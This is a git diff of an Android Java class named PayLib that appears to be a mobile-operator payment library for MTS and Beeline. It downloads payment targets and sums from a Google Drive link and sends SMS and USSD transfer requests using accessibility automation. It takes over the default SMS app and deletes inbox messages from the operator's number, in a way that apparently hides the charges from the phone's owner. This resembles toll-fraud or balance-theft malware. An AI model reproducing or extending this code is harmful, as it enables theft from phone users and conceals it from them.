@@ -7,13 +7,12 @@ import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
-import android.provider.Telephony.Sms;
-import android.view.View;
+import android.provider.Telephony;
 
 import com.example.p2plib2.common.CommonFunctions;
 import com.example.p2plib2.common.FilesLoader;
-import com.example.p2plib2.operators.Beeline;
-import com.example.p2plib2.operators.MTS;
+import com.example.p2plib2.operators.Operator;
+import com.example.p2plib2.ussd.USSDController;
 import com.google.gson.Gson;
 
 import java.util.ArrayList;
@@ -23,76 +22,49 @@ import static com.example.p2plib2.ussd.USSDController.verifyAccesibilityAccess;
 
 
 public class PayLib implements PayInterface {
-    private static String operName = "";
     private String version = "1.0";
     private String operDest = "";
-    public String result;
-    String defaultSmsApp;
-    View v;
-    String downloadAdress = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download";
-    static MTS mts;
-    static Beeline beeline;
+    private static String defaultSmsApp;
+    private SharedPreferences operatorSettings;
+    public static Operator operator;
+    private HashMap<String, OperatorInfo> operatorInfo = new HashMap<>();
+    private HashMap<String, String> filters = new HashMap<>();
+
+    public static CallSmsResult feedback;
+    public static String operName = "";
+    public static Context cnt;
+    public static Activity act;
     public static Boolean flagok = false;
-    SharedPreferences mSettings;
-    public static final String PREFERENCES = "mysettings";
-    public static final String INFO = "operator"; // operators info
-    HashMap<String, OperatorInfo> operatorInfo = new HashMap<>();
-    /**
-     * info
-     */
-    public static String mts_SMS;
-    private String ussd;
-    private String target;
-    private static String sms;
-    static CallSmsResult smsResult;
-    static Context cnt;
-    /**
-     * Common
-     */
-    private String sum = "15";
-    public static void sendAnswer(String smsBody) {
-        switch (operName) {
-            case "MTS":
-                if (mts != null) {
-                    mts.sendAnswer(sms, smsBody);
-                } else {
-                    mts = new MTS(true, true, cnt);
-                }
-                break;
-            case "BEELINE":
-                if (beeline != null) {
-                    beeline.sendAnswer(sms, smsBody);
-                } else {
-                    beeline = new Beeline(true, true, cnt);
-                }
-                break;
-        }
 
-    }
+    private static final int DEF_SMS_REQ = 0;
+    public static final String PREFERENCES = "operSetting";
 
-    /**
-     * Initialization
-     */
+
     public static String getOperName() {
         return operName;
     }
 
     public static void getSMSResult(String smsBody) {
-        Logger.lg("smsBody " + smsBody);
-        smsResult.callResult(smsBody);
+        Logger.lg("smsBody from lib: " + smsBody);
+        feedback.callResult(smsBody);
     }
 
-    private void ini(Activity act, Context cnt, CallSmsResult smsResult) {
-        this.smsResult = smsResult;
+    @Override
+    public void updateData(Activity act, Context cnt, CallSmsResult feedback, Boolean sendWithSaveOutput, Boolean sendWithSaveInput) {
+        this.feedback = feedback;
         this.cnt = cnt;
+        this.act = act;
         CommonFunctions.permissionCheck(cnt, act);
+        USSDController.verifyAccesibilityAccess(act);
         verifyAccesibilityAccess(act);
-        mSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
+        operatorSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
         /*Create necessary objects*/
         operName = CommonFunctions.operName(cnt);
+        operator = new Operator(CommonFunctions.operName(cnt), sendWithSaveOutput, sendWithSaveInput);
         new DownloadApkTask().execute();
     }
 
+    /***/
     private class DownloadApkTask extends AsyncTask<Void, Void, Void> {
 
         @Override
@@ -104,15 +76,12 @@ public class PayLib implements PayInterface {
         protected Void doInBackground(Void... params) {
             final FilesLoader load = new FilesLoader();
             String input = load.downloadJson("https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download");
-            Logger.lg("load items " + input);
-            SharedPreferences.Editor editor = mSettings.edit();
+            SharedPreferences.Editor editor = operatorSettings.edit();
             editor.putString(PREFERENCES, input);
             editor.apply();
             Gson g = new Gson();
-            Operator operator = g.fromJson(input, Operator.class);
+            OperatorList operator = g.fromJson(input, OperatorList.class);
             for (Object user : operator.operators) {
-                // OperatorInfo murzik = gson.fromJson(user.toString(), OperatorInfo.class);
-                // Logger.lg("info " + murzik);
                 Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
                 String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
                 OperatorInfo info = new OperatorInfo(
@@ -129,117 +98,93 @@ public class PayLib implements PayInterface {
 
         @Override
         protected void onPostExecute(Void result) {
-            initData();
+            setOperatorData();
         }
     }
 
-    class Operator {
+
+    public void setOperatorData() {
+        Logger.lg("KeySetData " + operatorInfo.keySet().toString()
+                + " " + getOperName());
+        if (operatorInfo.containsKey(operator.name)) {
+            OperatorInfo info = operatorInfo.get(getOperName());
+            operator.setData(info.smsNum, info.target, info.sum, info.ussdNum);
+            Logger.lg(operator.toString());
+        }
+        feedback.callResult("end of update");
+    }
+
+    class OperatorList {
         ArrayList operators;
     }
 
     class OperatorInfo {
         String operator;
-        String sms_number;
-        String ussd;
+        String smsNum;
+        String ussdNum;
         String target;
         String sum;
 
         public OperatorInfo(String s, String s1, String s2, String s3, String s4) {
             this.operator = s;
-            this.sms_number = s1;
-            this.ussd = s2;
+            this.smsNum = s1;
+            this.ussdNum = s2;
             this.target = s3;
             this.sum = s4;
         }
     }
 
     /**
-     * Interface methods
+     * Reply answer code
      */
+    public static void sendAnswer(String smsBody) {
+        operator.sendAnswer(smsBody);
+    }
+
     @Override
-    public String sendSms(Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Activity act, Context cnt) {
-        switch (operName) {
-            case "MTS":
-                mts = new MTS(target, sum, sendWithSaveOutput, sendWithSaveInput, cnt);
-                result = mts.sendSMS();
-                if (sendWithSaveInput == false) {
-                    deleteSMS();
-                }
-                break;
-            case "BEELINE":
-                beeline = new Beeline(sms, target, sum, sendWithSaveOutput, sendWithSaveInput, cnt);
-                result = beeline.sendSMS(act);
-                if (sendWithSaveInput == false) {
-                    deleteSMS();
-                }
-                break;
+    public void sendSms(Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Activity act, Context cnt) {
+        if (sendWithSaveInput == false) {
+            operator.sendSMS();
+            deleteSMS(filters);
+        } else {
+            operator.sendSMS();
         }
-        return result;
     }
 
     @Override
     public void sendUssd(String operDestination, Activity act) {
         flagok = true;
-        String input = mSettings.getAll().get("mysettings").toString();
-        Logger.lg("inpu " + mSettings.getAll().get("mysettings"));
-        Gson g = new Gson();
-        Operator operator = g.fromJson(input, Operator.class);
-        for (Object user : operator.operators) {
-            // OperatorInfo murzik = gson.fromJson(user.toString(), OperatorInfo.class);
-            // Logger.lg("info " + murzik);
-            Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
-            String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
-            OperatorInfo info = new OperatorInfo(
-                    separated[0].substring(separated[0].indexOf("=") + 1),
-                    separated[1].substring(separated[1].indexOf("=") + 1),
-                    separated[2].substring(separated[2].indexOf("=") + 1),
-                    separated[3].substring(separated[3].indexOf("=") + 1),
-                    separated[4].substring(separated[4].indexOf("=") + 1));
-            String opr = separated[0].substring(separated[0].indexOf("=") + 1);
-            operatorInfo.put(opr.toUpperCase(), info);
-            Logger.lg("opr " + opr.toUpperCase());
-        }
-        if (operatorInfo.containsKey(getOperName())) {
-            OperatorInfo info = operatorInfo.get(getOperName());
-            switch (operName) {
-                case "MTS":
-                    mts = new MTS(true, true, cnt);
-                    mts.sendUssd(info.ussd, info.target, info.sum, operDestination, act);
-                    break;
-                case "BEELINE":
-                    beeline = new Beeline(true, true, cnt);
-                    beeline.sendUssd(info.ussd, info.target, info.sum, operDestination, act);
-                    break;
-            }
-        }
+        operator.sendUssd(operDestination, act);
     }
 
-    @Override
-    public void updateData(Activity act, Context cnt, CallSmsResult res) {
-        ini(act, cnt, res);
-    }
 
     @Override
     public String getVersion() {
         return version;
     }
 
-    /**
-     * SMS working
-     */
+    public void setFilter(HashMap<String, String> filters) {
+        this.filters.putAll(filters);
+    }
 
-    public void deleteSMS() {
+    public void checkSmsDefaultApp(boolean deleteFlag, Integer code) {
         final String myPackageName = cnt.getPackageName();
-        defaultSmsApp = Sms.getDefaultSmsPackage(cnt);
-        Logger.lg(myPackageName + "  " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
-        if (!defaultSmsApp.equals(myPackageName)) {
-            launchAppChooser(myPackageName);
+        defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(cnt);
+        Logger.lg( deleteFlag + " MyPackageName  " + myPackageName + "  defaultSmsApp now " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
+        if(!myPackageName.equals(defaultSmsApp)&& deleteFlag == true){
+            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+            act.startActivityForResult(intent, code);
+        } else {
+            Intent intent3 = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+            act.startActivityForResult(intent3, code);
         }
-        String filter = "";
+    }
+
+    public void deleteSMS(HashMap<String, String> filters) {
         Uri uriSms = Uri.parse("content://sms/inbox");
         Cursor c = cnt.getContentResolver().query(
                 uriSms, null, null, null, null);
-        Logger.lg(c.getCount() + " count");
+        Logger.lg("Sms in inbox: " + c.getCount());
         int flag = 0;
         if (c != null && c.moveToFirst()) {
             do {
@@ -248,50 +193,34 @@ public class PayLib implements PayInterface {
                 String address = c.getString(2);
                 String body = c.getString(5);
                 String date = c.getString(3);
-                Logger.lg("0>" + c.getString(0) + "1>" + c.getString(1)
-                        + "2>" + c.getString(2) + "<-1>"
-                        + c.getString(3) + "4>" + c.getString(4)
-                        + "5>" + c.getString(5));
-
-                if (address.equals("6996") && flag < 2) {
-                    // mLogger.logInfo("Deleting SMS with id: " + threadId);
+                Logger.lg("Message  " + c.getString(c.getColumnIndex("body")) + " id " + id + " date " + date +  " " + address.toUpperCase() + " " + operator.name + " " + (address.toUpperCase().equals(operator.name)));
+                if ((address.equals(operator.smsNum) || address.toUpperCase().equals(operator.name))  && flag < 2) {
                     int iko = cnt.getContentResolver().delete(
                             Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                     if (iko != 0) {
                         flag++;
                     }
-                    Logger.lg("Delete success......... " + iko);
-                } else {
-                    Logger.lg("v  " + flag);
+                    Logger.lg("Delete result " + iko);
                 }
             } while (c.moveToNext());
         }
-        launchAppChooser(defaultSmsApp);
-       /* DownloadDelete del = new DownloadDelete(filter);
-        del.execute();*/
-
-    }
-    private void launchAppChooser(String myPackageName){
-        Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
-        intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
-        cnt.startActivity(intent);
+        feedback.callResult("Delete  " + flag + " sms");
     }
 
-    /***Init data */
-    public void initData() {
-        Logger.lg("KeySetData " + operatorInfo.keySet().toString()
-                +" " + getOperName());
-        if (operatorInfo.containsKey(getOperName())) {
-            OperatorInfo info = operatorInfo.get(getOperName());
-           // operator.setData(info.sms_number, info.sms_target, info.sum, info.ussd);
-            /*Not needed in future*/
-            sms = info.sms_number;
-            ussd = info.ussd;
-            target = info.target;
-            sms = info.sms_number;
-            sum = info.sum;
-            Logger.lg( info.operator + " sms " + sms + " "  + " ussd "+ ussd + " target " + target
-                    + " sms_check " + sms+ " sum " + sum);
-        }
-    }
+//    @Override
+//    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+//        switch (requestCode) {
+//            case DEF_SMS_REQ:
+//                boolean isDefault = resultCode == Activity.RESULT_OK;
+//                Logger.lg("isDefault " + isDefault);
+//                if (isDefault) {
+//                    operator.sendSMS();
+//                    deleteSMS(filters);
+//                }
+//                break;
+//            default:
+//                break;
+//        }
+//    }
+
 }
